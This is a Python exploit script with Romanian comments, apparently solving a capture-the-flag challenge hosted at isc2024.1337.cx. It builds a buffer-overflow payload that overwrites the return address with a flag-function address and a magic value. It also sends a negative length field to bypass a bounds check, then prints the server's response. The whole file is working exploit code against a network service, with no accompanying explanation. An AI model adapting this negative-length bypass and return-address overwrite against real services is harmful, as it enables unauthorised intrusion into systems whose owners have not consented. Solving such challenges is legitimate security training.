import struct
import socket
import time

def exploit(host, port):

    ## Ghidra analysis and gdb debugging
    rbuf = 71                        # rbuf 0x47 
    db_first_flag_addr = 0x80497f8
    global_magix = 0x31337F7B
    eip = 0x8049a35
    
    ## Cream payload-ul pentru buffer overflow
    print(f"Creating payload with buffer size: {rbuf}")
    payload = b"A" * rbuf
    print(f"Adding db_first_flag address: 0x{db_first_flag_addr:x}")
    payload += struct.pack("<I", db_first_flag_addr)            # format little-endian 
    payload += b"B" * 4                                         # Adaugam padding
    print(f"Adding global_magix value: 0x{global_magix:x}")
    payload += struct.pack("<I", global_magix)                  # format little-endian  

    # Trebuie sa trimitem o valoare negativa pentru a da bypassa if-ului din proccess_loop
    len_p = len(payload)
    new_len = len_p - 256
    print(f"Negative value to bypass 'if': {new_len}")
    
    print(f"Connecting to {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect((host, port))
    print("Connected successfully")
        
    # Convertim payload-ul in bytes acolo unde nu il avem deja si il trimitem
    s.send(struct.pack("<i", new_len))  
    s.send(payload)
    s.send(struct.pack("<i", 0))
    time.sleep(1)
        
    response = s.recv(1024)
    print("Response received:")
    print(response)  # Printam raspunsul primit de la server codificat
    
    # Decodam raspunsul primit si il afisam
    print("Decoded response:")
    print(response.decode(errors = 'ignore'))
        

if __name__ == "__main__":
    HOST = "isc2024.1337.cx"
    PORT = 10109
    exploit(HOST, PORT)